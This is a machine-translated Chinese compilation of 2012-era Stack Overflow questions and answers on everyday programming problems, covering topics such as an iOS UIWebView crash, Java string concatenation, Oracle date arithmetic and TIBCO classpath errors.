> 
> 标签：iphone, ios, uiwebview, mobile-safari

应用程序在 webcore 上崩溃，在我们的应用程序中，我们正在 UIWebview 上加载 HTML5 页面。当用户导航到 UIWebView 上的不同屏幕时，应用程序会弹出警报，当用户单击 OK 按钮时，它会崩溃。

PS 注意：此警报是 HTML5 警报。不是本地人。

```
Thread 2 name:  WebThread
Thread 2 Crashed:

0   JavaScriptCore                    0x3570ec26 WTF::fastMalloc(unsigned long) + 870

1   WebCore                           0x32cf731c WebCore::CSSSelectorList::adoptSelectorVector(WTF::Vector<WTF::OwnPtr<WebCore::CSSParserSelector>, 0ul>&) + 136

2   WebCore                           0x32ceee10 cssyyparse(void*) + 848

3   WebCore                           0x32de641a WebCore::CSSParser::parseSelector(WTF::String const&, WebCore::Document*, WebCore::CSSSelectorList&) + 74

4   WebCore                           0x32de636e WebCore::Node::querySelectorAll(WTF::String const&, int&) + 90

5   WebCore                           0x32de62a8 WebCore::jsElementPrototypeFunctionQuerySelectorAll(JSC::ExecState*) + 328

6   JavaScriptCore                    0x35721592 JSC::Interpreter::privateExecute(JSC::Interpreter::ExecutionFlag, JSC::RegisterFile*, JSC::ExecState*) + 35526

7   JavaScriptCore                    0x357a00e6 JSC::Interpreter::executeCall(JSC::ExecState*, JSC::JSObject*, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) + 1042

8   JavaScriptCore                    0x3579fcca JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) + 46

9   WebCore                           0x32e28cfc WebCore::JSEventListener::handleEvent(WebCore::ScriptExecutionContext*, WebCore::Event*) + 776

10  WebCore                           0x32e289c0 WebCore::EventTarget::fireEventListeners(WebCore::Event*, WebCore::EventTargetData*, WTF::Vector<WebCore::RegisteredEventListener, 1ul>&) + 272

11  WebCore                           0x32d2f36c WebCore::EventTarget::fireEventListeners(WebCore::Event*) + 136

12  WebCore                           0x32d358de WebCore::Node::handleLocalEvents(WebCore::Event*) + 54

13  WebCore                           0x32d3512e WebCore::EventDispatcher::dispatchEvent(WTF::PassRefPtr<WebCore::Event>) + 542

14  WebCore                           0x32d34ee0 WebCore::EventDispatchMediator::dispatchEvent(WebCore::EventDispatcher*) const + 24

15  WebCore                           0x32d34eb4 WebCore::EventDispatcher::dispatchEvent(WebCore::Node*, WebCore::EventDispatchMediator const&) + 92

16  WebCore                           0x32d34e0c WebCore::Node::dispatchEvent(WTF::PassRefPtr<WebCore::Event>) + 28
17  WebCore                           0x32d87eb8 WebCore::Document::finishedParsing() + 96
18  WebCore                           0x32d87e50 WebCore::HTMLTreeBuilder::finished() + 16
19  WebCore                           0x32d78fbe WebCore::HTMLDocumentParser::prepareToStopParsing() + 106
20  WebCore                           0x32d78c9e WebCore::HTMLDocumentParser::finish() + 90
21  WebCore                           0x32d78c3a WebCore::Document::finishParsing() + 14
22  WebCore                           0x32d75e62 WebCore::DocumentWriter::endIfNotLoadingMainResource() + 74
23  WebCore                           0x32d744fa WebCore::DocumentLoader::finishedLoading() + 74
24  WebCore                           0x32dc19c8 WebCore::FrameLoader::finishedLoading() + 48
25  WebCore                           0x32dc1938 WebCore::MainResourceLoader::didFinishLoading(double) + 88
26  WebCore                           0x32dc18c2 _ZN7WebCoreL16didFinishLoadingEP16_CFURLConnectionPKv + 46
27  CFNetwork                         0x371097ee URLConnectionClient::_clientDidFinishLoading(URLConnectionClient::ClientConnectionEventQueue*) + 186
28  CFNetwork                         0x370fe49e URLConnectionClient::ClientConnectionEventQueue::processAllEventsAndConsumePayload(XConnectionEventInfo<XClientEvent, XClientEventParams>*, long) + 418
29  CFNetwork                         0x370fe19c URLConnectionClient::processEvents() + 100
30  CFNetwork                         0x370fe0d2 MultiplexerSource::perform() + 150
31  CoreFoundation                    0x37445acc __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__ + 8
32  CoreFoundation                    0x37445298 __CFRunLoopDoSources0 + 208
33  CoreFoundation                    0x3744403e __CFRunLoopRun + 646
34  CoreFoundation                    0x373c749e CFRunLoopRunSpecific + 294
35  CoreFoundation                    0x373c7366 CFRunLoopRunInMode + 98
36  WebCore                           0x32d70c9c _ZL12RunWebThreadPv + 396
37  libsystem_c.dylib                 0x33ce672e _pthread_start + 314
38  libsystem_c.dylib                 0x33ce65e8 thread_start + 0 
```

通过崩溃日志，很难找出确切的原因。请帮忙..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T15:38:07.737

碰巧我知道你正在写的应用程序，所以我在这里的回答有点作弊。

我将在这里说一下我在其他对话中最终得出的结论：您遇到的是记忆问题。应用程序的总内存已超过可用内存，这会导致应用程序崩溃。碰巧您在内存分配函数中遇到了这个问题，可能是因为应用程序无法获得更多内存。

我们已经离线讨论了导致内存问题的原因。

# pdf - 如何一遍又一遍地重复相同的pdf表格（可填写）

> ID：11651658
> 
> 赞同：1
> 
> 时间：2012-07-25T14:08:29.403
> 
> 标签：pdf

我需要为不同的人填写相同的一页表格 20 次。现在，当我制作了该表格的 20 份副本并将它们合并时。（我需要将它们全部放在一个文件中，并且通过打印它们而不是静态的可填充甲酸盐）。所以我合并了它们，但现在如果我在第一个表单中输入一个名称，它会自动复制到具有相同字段的所有 19 页的其余部分。如果我以任何其他形式更改名称，例如在第 9 页中，它将自动更新所有页面的重置。这意味着我无法在具有相同类型的可填充页面和相同字段的文件中放置不同的名称。请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:29:25.340

您需要在合并之前重命名每个 PDF 文件的字段，否则对名为“LastName”的字段的每个引用都将被视为相同的字段，即使这些引用位于不同的页面上。您可以添加某种独特的前缀，例如您可以为您的文件设置一个计数器并将其作为每个字段的前缀。

# email - 从脚本生成电子邮件地址

> ID：11651662
> 
> 赞同：1
> 
> 时间：2012-07-25T14:08:39.903
> 
> 标签：email, jenkins

我们有一个环境，`svn`凭据是 Linux 用户名，包括：一个名字的字母和 5 个姓氏的字母。但是，我们有格式为 的电子邮件地址`firstname`。`lastname`@company.org。我们有一种方法可以使用脚本将凭证名称与电子邮件地址联系起来，但是我不知道如何告诉 jenkins 在检测到新用户签入时使用此脚本。

是否有一种简单的方法可以运行脚本以在创建新用户时生成用户的电子邮件地址？或者，每次用户应该接收邮件时计算电子邮件地址也可以。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-26T13:29:27.023

通过 askmish 的小提示，我得出了这个结论：

安装电子邮件分机

配置项目以`editable email notification` 编辑 presend 脚本以读取如下内容：

```
import javax.mail.Message.RecipientType
msg.setRecipients(RecipientType.TO, 'address@real.com' ) 
```

您可能还想做一些输出，否则只会显示错误的电子邮件地址。

# python - 为什么我需要为 f.readlines() 分配一个变量以获得它的长度？

> ID：11651670
> 
> 赞同：5
> 
> 时间：2012-07-25T14:09:05.627
> 
> 标签：python, list

如果我做：

```
os.chdir(path)
f = open(file,"r")

lines = f.readlines()
print "without assignment " + str(len(f.readlines()))
print "with assignment     " + str(len(lines)) 
```

我希望输出是相同的，但它不是：

```
without assignment 0
with assigment     1268 
```

为什么是这样？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-25T14:10:29.217

文件对象`f`是文件行的迭代器。`f.readlines()`将文件光标移动到末尾，但保存行，`lines`这就是第二个示例适用于您的原因。第一个示例不起作用，因为您已到达文件末尾并且没有可读取的行。`f.seek(0)`如果您想完成这项工作，您可以使用将光标移回文件的开头。

# html - 如何在虚线边框内水平和垂直居中文本

> ID：11651674
> 
> 赞同：1
> 
> 时间：2012-07-25T14:09:15.167
> 
> 标签：html, css

我需要在虚线边框之间垂直和水平居中一些文本，如下图所示：

![在此处输入图像描述](../Images/b8b437439fb330248393212bf72b7bee.png)

我有一个[非常简单的小提琴](http://jsfiddle.net/eCUv9/2/)试图实现这一点。

如何修改 css 以显示为附加的屏幕截图？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:13:24.240

您可以尝试使用文本浮动 div 并为其设置边距以将其放置在边框上。

**HTML**

```
<div id="dotted">
    <div id="text">Text goes here.</div>
</div> 
```

**CSS**

```
#dotted {
    border-top:1px dotted #000;
    padding:10px;
}

#text {
    float:left;
    padding:0 10px 0 10px;
    margin:-20px 0 0 30px;
    background:#fff;
} 
```

​ JS 小提琴：http: [//jsfiddle.net/aBDjY/2/](http://jsfiddle.net/aBDjY/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:56:57.780

[http://jsfiddle.net/lukas2012/aHNh6/5/](http://jsfiddle.net/lukas2012/aHNh6/5/)

您还可以使用伪元素 (:after)

并`text-align: center`与`display: inline-block`

这样，它可以处理任何文本，并且您的布局不会因移动相对元素而受到刺激

要保持背景颜色动态，只需使用`background-color: inherit;`

```
.wrap{
    position: relative;
    margin: 100px auto;
    width: 500px;
    text-align: center;
    background: #ff0;

}
.wrap:after {
    content: '';
    border-top:1px dotted #000;
    position: absolute;
    left: 0;
    z-index: 0;
    top: 50%;
    width: 100%;
    height: 1px;

}

.text {
    background-color: inherit;
    position: relative;
    margin:0  auto;
    display: inline-block;
    z-index: 1;
}
​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:25:22.023

您可以使用 CSS 定位来执行此操作...

看一下这个 ：

**[我的小提琴](http://jsfiddle.net/aHNh6/1/)**（水平）

**[我的小提琴](http://jsfiddle.net/aHNh6/2/)**（垂直）

# javascript - Backbone.js - 带有上一页标签的后退按钮 (window.history.back)

> ID：11651677
> 
> 赞同：3
> 
> 时间：2012-07-25T14:09:22.693
> 
> 标签：javascript, javascript-events, backbone.js

我想显示一个带有与上一页相关的标签（标题或类似内容）的后退按钮，该按钮将在点击事件中调用。我目前`window.history.back()`在活动中使用该功能，但如何获得标签？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:34:55.987

开箱即用的 JS 允许询问[以前的 URL](https://stackoverflow.com/questions/3528324/how-do-you-get-the-previous-url-in-javascript)，但不能询问以前的标题。

您可以使用其他自定义实现。例如使用 cookie：

```
// code simplified and no tested
function pushHistory() {
  var history = getHistory();
  var newHistory = {
    url:   window.location.pathname,
    title: $("title").text()
  }
  history.push( newHistory );

  $.cookie( "app.history", JSON.parse( history ) );
}

function getHistory(){
  return JSON.parse( $.cookie( "app.history" ) );
} 
```

*注意：我使用[jquery-cookie 插件](https://github.com/carhartl/jquery-cookie/)来简化代码。*

现在由您来调用`pushHistory()`用户访问的每个页面，并在“app.history”cookie 中使用适当的元素来显示信息。

# java - 从 ArrayList 中删除重复的对象

> ID：11651680
> 
> 赞同：0
> 
> 时间：2012-07-25T14:09:33.600
> 
> 标签：java, arraylist

我有一个Java类

```
class Students{
    private String fName;   
    private String lName;
    private String uName;

    public Students(String fName, String lName, String uName) {
            this.fName = fName;
            this.lName = lName;
            this.uName = uName;
     }      

    public String getuName() {
        return uName;
    }
    public void setuName(String uName) {
        this.uName = uName;
    }
    public String getfName() {
        return fName;
    }
    public void setfName(String fName) {
        this.fName = fName;
    }
    public String getlName() {
        return lName;
    }
    public void setlName(String lName) {
        this.lName = lName;
    }

} 
```

现在我将对象创建为；

```
 Students students1 = new Students("har","mat","harmat");
    Students students2 = new Students("pan","son","panson");
    Students students3 = new Students("yogi","jos","yogijos");

    Students students4 = new Students("har","mat","harmat");
    Students students5 = new Students("pan","son","harmat");
    Students students6 = new Students("yogi","jos","someotherUName");
    Students students7 = new Students("yogi","jos","someotherUName2"); 
```

现在所有这些对象都被添加到 combineList

```
List combinedList = new ArrayList<SchoolStudents>(); 
```

我想根据以下条件从此组合列表中删除重复的对象；如果 fName 相同或 uName 相同。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T14:13:50.853

如果这是确定 2 名学生是否平等的一般标准，您可以覆盖`equals`并`hashcode`在您的班级中根据您的标准使 2 名学生平等。

然后，您可以将学生添加到集合（通常是[HashSet](http://docs.oracle.com/javase/7/docs/api/java/util/HashSet.html)，它将自动删除重复项。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:15:14.830

如果您需要一个唯一列表，我建议您使用`List`界面中的任何内容。你会更好地使用[`Set`](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/Set.html)

类的覆盖`hashCode()`和`equals()`方法`Students`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T14:16:11.947

建议在您的 Student 类中实现`equals()`并`hashCode()`使用[HashSet](http://docs.oracle.com/javase/6/docs/api/java/util/HashSet.html)来强制唯一性。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-25T14:14:35.457

将它们存储在 a `Set`（例如 a `TreeSet`）中，并在构造时提供`Comparator`满足`Set`您的标准`fName`或`uName`相同的 a 。

（我假设重复的定义对学生来说是外部的，例如它在不同的时间意味着不同的东西。如果它是学生固有的，那么@assylias 的答案更有意义）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-06-20T15:01:23.260

```
public List<User> removeDuplicateFromList(List<User> list){
    int s=0;
    List<User> users=new ArrayList<User>();
    for(User us1 :list){
        for(User us2:users){
        if(us1.getIdUser()==us2.getIdUser()){
            s=1;
        }else{
            s=0;
        }

        }   if(s==0){
            users.add(us1);
        }

    }
    return users;
} 
```

# hibernate - 休眠分离条件

> ID：11651685
> 
> 赞同：0
> 
> 时间：2012-07-25T14:09:52.883
> 
> 标签：hibernate

我想知道是否有办法为休眠析取添加条件？

例子

```
 Criterion creator;

             if(securityService.hasRole(RoleConstants.ROLE_CREATOR) {
                 creator = Restrictions.conjunction()
                 .add(Restrictions.eq("creator", this.userInfo.getUser()))
                 .add(Restrictions.eq("currentState.id", DatabaseConstants.STATE_DRAFT));
             }

    Criterion completeCondition = Restrictions.disjunction().add(creator)
                                                            .add(authorizer)
                                                            .add(assessor); 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:51:24.440

我想出了如何使用析取条件。

```
 Disjunction dis = Restrictions.disjunction(); 
            if(this.securityService.hasRole(RoleConstants.ROLE_AUTHORIZER)) {
                dis.add(Restrictions.eq("currentState.id", DatabaseConstants.STATE_AUTHORIZER_REVIEW));
            }

            if(this.securityService.hasRole(RoleConstants.ROLE_ASSIGNOR)) {
                dis.add(Restrictions.eq("currentState.id", DatabaseConstants.STATE_ASSIGNOR_REVIEW));
            }

            if(this.securityService.hasRole(RoleConstants.ROLE_ASSESSOR)) {
                dis.add(Restrictions.eq("currentState.id", DatabaseConstants.STATE_ASSESSOR_REVIEW));
            }

    Criteria criteriaStatic = this.session.createCriteria(PurchaseRequest.class)
            .add(Restrictions.isNull("authorizedArchiveDate"))    
            .add(dis); 
```

# java - 如何从服务器获取序列化策略文件的强哈希名称？

> ID：11651688
> 
> 赞同：2
> 
> 时间：2012-07-25T14:09:59.717
> 
> 标签：java, gwt, hash, rpc, payload

我需要向基于 gwt 的服务器发送一条简单的消息。众所周知，消息的有效载荷中是我们要发送消息的服务的序列化策略文件的强哈希名称。在服务器-客户端通信中，我可以在哪里获得此哈希？Web 浏览器做到了，我正在由提琴手分析萤火虫通信，但我没有看到来自服务器的任何带有此哈希的消息。那么，客户端的 Web 浏览器如何知道，哪个强哈希名称将消息的有效负载发送到服务？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T15:20:38.730

它在生成的 JS 中被硬编码，客户端与服务器通信的方式是**它**使用的服务*版本*。

使用 GWT-RPC，客户端和服务器必须同步（尽管从技术上讲，我认为您可以同时支持多个*版本*的服务 - 正如客户端所知道的那样），这就是他们检查它的方式：客户端说“这就是我知道如何与您交谈的方式”，服务器首先检查它是否可以（加载序列化策略），然后继续或立即失败并返回`IncompatibleRemoteServiceException`.
所以它实际上永远不会**由**服务器发送（嗯，在 JS 代码中是的，但现在通过 RPC）。

# java - 为什么添加 String 和 int 会这样？

> ID：11651689
> 
> 赞同：-1
> 
> 时间：2012-07-25T14:10:03.820
> 
> 标签：java

当我运行以下代码时：

```
public class LianXi1 
{ 
   public static void main(String args[]) 
   { 
     int a=12; 
     int b=23; 
     System.out.println("case 1"+a); //

     System.out.println("case 2"+b); //

   } 
} 
```

我得到这个结果：

```
@ubuntu:~/mycode/test$ java LianXi1 
case 112
case 223 
```

但我不明白结果，谁能帮忙？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-07-25T14:11:09.060

当你将一个字符串和一个整数相加时，它会执行“字符串连接”，它将你的整数转换为一个字符串并将其粘贴在另一个字符串的末尾。

```
"Case 1" + 12 
```

... 是相同的

```
"Case 1" + "12" 
```

因此，您的结果将是第一个带有字符的字符串`12`。

因此： `Case 112`

来自关于字符串的 Java 文档：

> “Java 语言为字符串连接运算符 (+) 以及其他对象到字符串的转换提供了特殊支持。字符串连接是通过 StringBuffer 类及其 append 方法实现的。字符串转换是通过 Object 定义的 toString 方法实现的并由 Java 中的所有类继承。有关字符串连接和转换的更多信息，请参阅 Gosling、Joy 和 Steele，Java 语言规范。

但小心点！从左到右添加作品，那么接下来会打印什么？

```
System.out.println(1 + 2 + "test" + 3 + 4); 
```

首先，它确实`1 + 2`，它等于`3`。

然后它会`3`（最后一步的结果）`+ "test"`，这会导致`"3test"`

接下来，它会执行`"3test" + 3`，这会导致`"3test3"`。

最后，`"3test3 + 4`是`"3test34`。

如您所见，在事物周围加上括号以确保它们按您想要的顺序出现是个好主意。

`(1 + 2) + "test" + (3 + 4)`将是“3test7”，因为括号中的数学具有优先权。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T14:14:06.813

当在字符串和 int 或字符串与任何其他原始数据类型（如 float、long、short 等）之间执行连接操作时，原始数据始终转换为要附加到原始字符串上的字符串。您的输出显示字符串加上变量 a 和 b 的字符串表示形式。

见：[http ://www.java-samples.com/showtutorial.php?tutorialid=217](http://www.java-samples.com/showtutorial.php?tutorialid=217)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T14:18:35.670

如果您使用“+”运算符隐含函数调用，例如“toString()”

改变你的类型 int => Integer 然后试试这个。

```
public class Main { 
   public static void main(String args[]) { 
     Integer a=12; 
     Integer b=23;

     System.out.println("case 1" + a.toString()); //
     System.out.println("case 2" + b.toString()); //
   } 
} 
```

因为

```
"case 1" + a => "case 1" + a.toString(); => "case 1" + "12"; 
```

和其他类型一样

```
 this + a => this.toString() + a.toString() 
```

祝你好运！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-25T14:14:58.577

“添加”一个 String 和一个 int 是什么意思？在 Java 中，您*必须*在运算符的两侧具有相同的类型才能执行所需的操作。在许多不匹配的情况下，Java 会将一个值转换为与另一个相同的类型。在这种情况下，int 被转换为 String，因为通常很难将 String 转换为 int。现在 + 运算符在第一个 println() 调用中“连接”两个字符串“case 1”和“12”。“连接”只是意味着将两个字符串连接成一个字符串，在这种情况下创建字符串“case112”，您会看到输出。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-25T14:16:50.650

它在java中是默认的。如果你做“string”+“int”，java会首先将整数转换为字符串，然后将字符串和“int”字符串连接起来。所以在你的情况下：“Case 1”与int“12”的字符串值连接，结果是“Case 112”。同样是“案例223”。如果你想让它做加法操作。你应该这样做 System.out.println("case " + (1+a) ); 那么输出将是：案例 13

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-25T14:21:25.827

我认为您需要阅读[The Java Language Specification#15.18.1 String Concatenation Operator +](http://docs.oracle.com/javase/specs/jls/se5.0/html/expressions.html#15.18.1)

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2012-07-25T14:17:21.713

当你打印一个整数时，除了一个字符串，它就像一个字符串。但是，如果您这样做了：

```
System.out.println(1+1); 
```

它会打印出 2。这是因为整数紧挨着另一个。

如果你这样做了：

```
System.out.println("Test"+1+1); 
```

它会打印Test2。因为，您首先查看数字的加法。希望我有所帮助。

# php - 从谷歌地图 v3 上的数据库 MySQL 加载标记

> ID：11651690
> 
> 赞同：3
> 
> 时间：2012-07-25T14:10:06.297
> 
> 标签：php, mysql, ajax, json, google-maps-api-3

我正在尝试将一些标记信息发送到数据库，标记成功保存在数据库中，

但是我不能将数据带到加载标记的页面，我认为这是编程问题，或者将标记调用到它们的位置

我将发布我的示例的链接，以及它们的编程。

这是我的 index.html 代码

谢谢大家=)，等待一个答案，我不知道如何解决

编辑：我忘了说，如果你点击地图，它会创建一个标记，如果你点击这个标记，你可以编辑它的信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T17:36:06.890

一个问题可能与您的 latlng 变量有关。不确定 getposition 方法是否返回正确的格式。尝试 var latlng = new google.maps.LatLng(marker.getPostion().lat(), marker.getPosition().lng());

# android - 使用选项卡和使用按钮（尝试使其看起来像选项卡）有什么区别？

> ID：11651693
> 
> 赞同：1
> 
> 时间：2012-07-25T14:10:17.427
> 
> 标签：android

从 UI 的角度来看，这两种方式可能不太相同。

有什么真正的区别吗？

因为使用这种`Buttons`方式来实现`Tabs`真的让事情变得更容易，你只需简单地复制并粘贴到`Buttons`每个页面上，让它看起来像一个`Tab`.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-25T14:14:57.920

最大的不同是 android 设计[`Tabs`](http://developer.android.com/design/building-blocks/tabs.html)了[`Tabs`](http://developer.android.com/design/building-blocks/tabs.html)​​. 为您提供了许多预期的功能[`Tab`](http://developer.android.com/design/building-blocks/tabs.html)。

[`Buttons`](https://developer.android.com/guide/topics/ui/controls/button.html)设计具有您对[`Button`](https://developer.android.com/guide/topics/ui/controls/button.html).

如果你想[`Tabs`](http://developer.android.com/design/building-blocks/tabs.html)在你的应用程序中使用，你应该使用[`Tabs`](http://developer.android.com/design/building-blocks/tabs.html)，不要试图重新发明轮子。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-16T10:13:32.560

选项卡在所有屏幕上都可用，并使用选项卡主机。最好的例子是任何 android 设备中的音乐播放器应用程序。按钮更特定于用户事件控制。您可以在按钮上配置任何用户单击事件，它们都可以在不同情况下使用。选项卡可以与所有屏幕（或网站中的页面）中可用的网络选项卡相同，按钮可用于发送按钮或取消按钮等情况。

# django - 如何获取模板中的相关模型字段

> ID：11651698
> 
> 赞同：0
> 
> 时间：2012-07-25T14:10:29.793
> 
> 标签：django

我有以下两种型号

```
LocalPart (models.Model):
... 
```

和

```
GlobalPart (models.Model):
....
localpart = models.ManyToManyField (LocalPart, related_name = 'localpart')
... 
```

我想在调用 LocalPart 时引用相关的 GlobalParts。

我该怎么做呢？

我尝试了以下方法：{{ part.localpart_set.all }} 和 {{ part.GlobalPart_set.all }} 其中 part 是 localpart 中的一个条目。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:41:02.517

试试这个：

```
localpart = LocalPart.objects.get(...)
localpart.localpart.all() 
```

...“localpart”的相关名称在这里有点令人困惑。

# java - Android 应用程序开发 - 相机应用程序的问题

> ID：11651705
> 
> 赞同：0
> 
> 时间：2012-07-25T14:10:50.790
> 
> 标签：java, android

我正在开发一个简单的应用程序，旨在利用相机 API 并拍照然后保存。我在运行时收到一些奇怪的错误，并收到“不幸的是，CameraDemo 已停止”的文本。

我从本教程中获得了代码：http: [//marakana.com/forums/android/examples/39.html](http://marakana.com/forums/android/examples/39.html)

`mHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);`显然现在已弃用。有没有其他选择，因为我认为这是导致问题的原因。

这也是我的 logcat 错误日志文件：

![logcat 错误打印](../Images/48988957eaa12417918f21ca0aecbb3d.png)

有人知道出了什么问题吗？谢谢，丹

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:22:09.570

预览代码中的第 37 行看起来像是调用 camera.open() 之后的行你确定它没有失败并返回一个空相机对象吗？

# c# - 使用 StreamWriter 在网站根文件夹外创建 txt 文件

> ID：11651706
> 
> 赞同：0
> 
> 时间：2012-07-25T14:10:52.087
> 
> 标签：c#, asp.net, visual-studio-2010, streamwriter

Web 应用程序是否可以使用`StreamWriter`? 即使拥有完全权限，我也无法使其工作。

```
 string vRegistro = "Some test";
        StreamWriter tex = new StreamWriter(@"\\ICOM\public.txt", true, Encoding.UTF8);

        tex.WriteLine(vRegistro);
        tex.Close(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:13:08.973

`\\ICOM\public.txt`将被解释为 UNC 路径，因为 is 以双反斜杠开头。

那不是valic UNC。

从一开始删除反斜杠将导致一个名为的文件`public.txt`被写入应用程序环境根目录的 ICOM 文件夹。

# oracle - 如何使用 oracle 内联查询从 sysdate 中减去日期？

> ID：11651708
> 
> 赞同：0
> 
> 时间：2012-07-25T14:11:07.687
> 
> 标签：oracle, oracle11g

我正在创建一个查询。在那个查询中，我想从系统日期减去日期。我的桌子如下所示。

```
Table Name : Employee
---------------------
ID
NAME
JOINDATE 
```

我正在编写此查询以获取我的结果

```
SELECT * FROM SS.EMPLOYEE WHERE (sysdate - JOINDATE)='05-Ded-11' 
```

这会引发以下错误：

```
SQL Error: ORA-00920: invalid relational operator 
```

那么如何做到这一点???如果有人知道，请帮助我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:25:04.807

在 Oracle 日期算术中，减去两个日期会得到两个日期之间的天数：

```
SQL> SELECT DATE '2000-12-31' - DATE '2000-01-01' year FROM DUAL;

      YEAR
----------
       365 
```

因此，您的`WHERE`条款对 Oracle 不正确，因为它无法将数字与日期进行比较。你想用这个比较来表达什么？

如果要过滤给定日期之前的所有日期，只需比较两个日期：

```
SELECT * FROM SS.EMPLOYEE WHERE joindate <= to_date('2011-12-05', 'yyyy-mm-dd') 
```

如果要选择给定区间内的所有行，可以使用多重比较或运算符`BETWEEN`：

```
SELECT * 
  FROM SS.EMPLOYEE 
 WHERE joindate BETWEEN to_date('2011-12-05', 'yyyy-mm-dd') AND SYSDATE 
```

### 更新

两个日期之间的月数由函数给出[`MONTHS_BETWEEN`](http://docs.oracle.com/cd/E11882_01/server.112/e26088/functions102.htm#i78039)。您可以将此函数的结果与（月）数进行比较。

# classnotfoundexception - Tibco 错误：ClassNotFoundException：com.tibco.tibjms.naming.TibjmsInitialContextFactory

> ID：11651709
> 
> 赞同：2
> 
> 时间：2012-07-25T14:11:08.437
> 
> 标签：classnotfoundexception, tibco, tibco-ems

我正面临这个问题。我使用以下配置（本地 tibco）测试了 tibco，它可以工作

```
<jee:jndi-lookup id="connectionFactory" jndi-name="emsConnectionFactory">
    <jee:environment>
        java.naming.factory.initial=com.tibco.tibjms.naming.TibjmsInitialContextFactory
        java.naming.provider.url=tibjmsnaming://localhost:7222
    </jee:environment>
</jee:jndi-lookup>

<jee:jndi-lookup id="queue" jndi-name="emsQueue">
    <jee:environment>
        java.naming.factory.initial=com.tibco.tibjms.naming.TibjmsInitialContextFactory
        java.naming.provider.url=tibjmsnaming://localhost:7222
    </jee:environment> 
```

但是，当我尝试使用以下配置连接到中央 tibco（仅更改了提供程序）时，我收到了 classNotFound 错误

```
 <jee:jndi-lookup id="connectionFactory" jndi-name="XAQueueConnectionFactory"> 
    <jee:environment>
        java.naming.factory.initial=com.tibco.tibjms.naming.TibjmsInitialContextFactory 
        java.naming.provider.url=tcp://xsdd.xxxxxxxxx.local:8333
    </jee:environment> 
</jee:jndi-lookup> 
<jee:jndi-lookup id="queue" jndi-name="ibalance/iBatch/ReBalances">
    <jee:environment> 
        java.naming.factory.initial=com.tibco.tibjms.naming.TibjmsInitialContextFactory
        java.naming.provider.url=tcp://xxxxxxx.xxxxxxxxxxx.local:8333
    </jee:environment>
</jee:jndi-lookup> 
```

我得到的错误是

```
 Caused by: java.lang.ClassNotFoundException: com.tibco.tibjms.naming.TibjmsInitialContextFactory 
at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1701)
at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1546)
at java.lang.Class.forName0(Native Method)
at java.lang.Class.forName(Class.java:247)
at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:46)
at javax.naming.spi.NamingManager.getInitialContext(NamingManager.java:654) 
```

任何建议都会有很大帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-26T12:33:15.337

这显然是一个类路径错误。您是否在本地计算机上同时运行两者？

如果第二个在某处的服务器上运行，请确保在类路径中引用了 EMS jar 库。我相信你追求的是`tibjms.jar`.

引用 jar 文件的方式取决于您的环境和技术。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-26T12:54:48.087

您在类路径中缺少 tibjms.jar。如果启用了 EMS 服务器上的任何安全选项，请确保您也添加了 tibcrypt.jar。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-06-14T22:39:48.487

就我而言，问题非常愚蠢。类路径的末尾有一个空格。即“com.tibco.tibjms.TibjmsQueueConnectionFactory”

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-03-23T18:33:39.153

1.  关闭 TIBCO 设计器。
2.  打开位于路径 C:\tibco\designer\5.10\bin 中的 Designer.tra 文件
3.  添加这个路径；%TRA_HOME%/lib/TIBCOjms.jar 在##的最后部分这将被添加到 tibco.class.path.extended
4.  将随附的小册子复制到路径C:\tibco\tra\5.10\lib
5.  准备好这个应该可以工作，只需启动设计器就可以了。

下载的jar是TIBCOjms.jar

# mahout - 使用 Mahout 训练 LDA 并检索其主题

> ID：11651713
> 
> 赞同：3
> 
> 时间：2012-07-25T14:11:13.490
> 
> 标签：mahout, lda, topic-modeling

我正在尝试 Apache Mahout 并且有很多关于如何使用 LDA 生成主题模型的信息，但是关于如何使用他们的新 CVB lda 算法来做同样的事情的信息很少。我想要做的是生成与原始主题类似的单词的概率`ldatopic`。

